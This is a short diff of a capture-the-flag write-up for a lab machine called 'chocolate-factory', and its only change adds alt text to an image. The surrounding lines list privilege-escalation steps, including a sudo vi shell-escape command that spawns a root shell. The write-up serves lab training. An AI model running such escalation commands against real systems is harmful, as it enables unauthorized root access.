@@ -137,7 +137,7 @@ User charlie may run the following commands on chocolate-factory:
 - ``sudo vi -c ':!/bin/sh' /dev/null``
 - ``python /root/rooy.py`` and enter the key we found with ``strings`` on ``key_rev_key``
 
-![](/assets/chocolate-factory01.png)
+![0xskar](/assets/chocolate-factory01.png)
 
 * * * 
 
